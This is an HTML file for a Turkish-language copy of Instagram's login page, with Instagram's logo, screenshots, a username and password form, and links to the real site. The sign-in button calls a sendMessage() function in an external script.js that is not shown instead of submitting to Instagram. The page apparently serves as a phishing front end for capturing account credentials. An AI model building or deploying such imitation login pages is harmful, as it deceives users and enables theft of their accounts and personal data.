<!DOCTYPE html>
<html lang="tr">

<head>
  <meta charset="UTF-8">
  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
  <title>Instagram</title>
  <link rel="stylesheet" href="css.css">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <span id="root">
    <section class="section-all">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <div class="phone-animation">
            <div class="phone-frame">
              <div class="phone-content">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.jpg/6f03eb85463c.jpg" class="phone-img" alt="Screenshot 1">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2-2x.jpg/947d5cd6ffeb.jpg" class="phone-img" alt="Screenshot 2">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3-2x.jpg/4d62acb667fb.jpg" class="phone-img" alt="Screenshot 3">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot4-2x.jpg/8458d667fb3b.jpg" class="phone-img" alt="Screenshot 4">
              </div>
            </div>
          </div>

          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form">
                    <div class="input-box">
                      <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                    </div>
                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Şifre" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>
                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Giriş yap</button>
                    </span>
                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Şifreni mi unuttun?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->
              <div class="login-box">
                <p class="text">Hesabın yok mu?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
              </div> <!-- Signup-box end -->
              <div class="app">
                <p>Uygulamayı indir.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>
                </div> <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>
      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href=""></a></li>
              <li><a href="https://about.instagram.com">About Us</a></li>
              <li><a href="https://help.instagram.com">Support</a></li>
              <li><a href="https://about.instagram.com/blog">Blog</a></li>
              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
              <li><a href="https://www.instagram.com/developer">Api</a></li>
              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
              <li><a href="">Instagram</a></li>
            </ul>
          </nav>
          <span class="footer-logo">&copy; 2024 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>
    </section>
  </span> <!-- Root -->

  <script src="script.js"></script>
</body>

</html>
